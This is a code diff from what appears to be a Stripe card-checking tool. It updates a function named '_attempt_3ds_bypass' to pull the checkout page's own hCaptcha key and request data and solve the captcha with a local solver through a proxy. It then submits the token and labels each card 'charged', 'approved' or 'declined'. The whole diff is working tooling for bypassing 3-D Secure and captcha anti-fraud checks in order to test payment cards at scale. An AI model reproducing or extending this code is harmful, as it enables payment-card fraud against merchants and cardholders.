@@ -365,6 +365,14 @@ async def _fetch_checkout_info(client, checkout_url):
         )
         pp_data = pp_resp.json()
         logger.info(f"Payment page info: status={pp_resp.status_code}, keys={list(pp_data.keys())[:10]}")
+        # The key and the request data the page came with.  They belong
+        # to this page, so they are read with it and kept: asking for
+        # them again later gives a different pair, and the answer for
+        # one pair is not the answer for the other.
+        page_site_key = pp_data.get("site_key") or ""
+        page_rqdata = pp_data.get("rqdata") or ""
+        if page_site_key:
+            logger.info("The page's own captcha key: %s", page_site_key)
 
         if "error" not in pp_data:
             amount = _extract_amount_from_pp(pp_data)
@@ -425,6 +433,8 @@ async def _fetch_checkout_info(client, checkout_url):
     billing_required = False
     customer_email = None
     success_url = ""
+    page_site_key = ""
+    page_rqdata = ""
     if "error" not in pp_data:
         billing_required = pp_data.get("billing_address_collection") == "required"
         customer_email = pp_data.get("customer_email")
@@ -452,6 +462,8 @@ async def _fetch_checkout_info(client, checkout_url):
         "billing_required": billing_required,
         "customer_email": customer_email,
         "whole_url": whole_url,
+        "page_site_key": page_site_key,
+        "page_rqdata": page_rqdata,
     }, None
 
 
@@ -1304,12 +1316,31 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                     return "live", "hCaptcha Challenge Required (no page)" 
                 captcha_ekey = ""
                 try:
-                    from captcha_solver import solve_hcaptcha_enterprise
-                    # the browser goes out the same way as the api, so
-                    # hCaptcha sees one address and not two
-                    captcha_token = await solve_hcaptcha_enterprise(
-                        site_key, captcha_page, rqdata=rqdata, session=client,
-                        proxy=proxy)
+                    # The captcha that is on the page is about the key
+                    # and the request data that came with the page, and
+                    # it is bound to the host of the frame the page put
+                    # it in.  So the answer is asked for there, with
+                    # those, and not with the ones the intent carries:
+                    # those are for a different captcha, on another host.
+                    page_key = site_key
+                    page_rq = rqdata
+                    try:
+                        from gates.stripe_captcha import page_captcha
+                        found = await page_captcha(client, session_id, pk)
+                        if found:
+                            page_key = found.get("site_key") or page_key
+                            page_rq = found.get("rqdata") or page_rq
+                    except Exception as e:
+                        logger.info("the page's own captcha could not be read: %s", e)
+                    # The pair that came with the page is the pair the
+                    # captcha on that page is about.
+                    page_key = (session_info or {}).get("page_site_key") or page_key
+                    page_rq = (session_info or {}).get("page_rqdata") or page_rq
+
+                    from local_hcaptcha_solver import solve_in_the_frame
+                    captcha_token = await solve_in_the_frame(
+                        captcha_page, page_key, rqdata=page_rq, proxy=proxy,
+                        timeout=90)
                     try:
                         from local_hcaptcha_solver import LAST_EKEY
                         captcha_ekey = LAST_EKEY or ""
@@ -1334,21 +1365,33 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                         "client_secret": cs,
                         "key": pk,
                         "captcha_vendor_name": "hcaptcha",
-                        "captcha_token": captcha_token,
-                        "passive_captcha_token": captcha_token,
-                        "challenge_response": captcha_token,
-                        "passive_captcha_ekey": captcha_ekey,
+                        "challenge_response_token": captcha_token,
                     }, headers=js_headers, timeout=15)
                     vr_json = vr.json()
-                    v_status = vr_json.get("status", "")
-                    logger.info(f"  the captcha verify -> HTTP {vr.status_code}, status={v_status}")
-                    if v_status in ("succeeded", "requires_capture", "processing"):
-                        if v_status == "succeeded": return "charged", "Charged (Captcha)"
-                        if v_status == "requires_capture": return "charged", "Authorized (Captcha)"
-                        return "approved", "Processing (Captcha)"
-                    if v_status == "requires_payment_method":
-                        le = vr_json.get("last_setup_error" if intent_type != "payment_intent" else "last_payment_error", {})
-                        if le: return _classify_confirm_error(le)
+                    logger.info(f"  the captcha verify -> HTTP {vr.status_code}")
+                    if vr.status_code == 200:
+                        # the answer was taken.  What happened to the
+                        # card is in the answer.
+                        pi_after = vr_json.get("payment_intent") or vr_json
+                        pi_status = pi_after.get("status", "")
+                        logger.info("  the card is now: %s", pi_status or "unknown")
+                        if pi_status == "succeeded":
+                            return "charged", "Charged (Captcha)"
+                        if pi_status == "requires_capture":
+                            return "charged", "Authorized (Captcha)"
+                        if pi_status == "processing":
+                            return "approved", "Processing (Captcha)"
+                        le = (pi_after.get("last_payment_error")
+                              or pi_after.get("last_setup_error") or {})
+                        if le:
+                            return _classify_confirm_error(le)
+                        if pi_status == "requires_payment_method":
+                            return "declined", "Payment method failed"
+                        return "declined", f"Payment failed ({pi_status})"
+                    err_msg = ""
+                    if isinstance(vr_json.get("error"), dict):
+                        err_msg = vr_json["error"].get("message", "")[:100]
+                    logger.info("  the captcha was refused: %s", err_msg or vr_json)
                 except Exception as e:
                     logger.info(f"  the captcha verify failed: {e}")
 
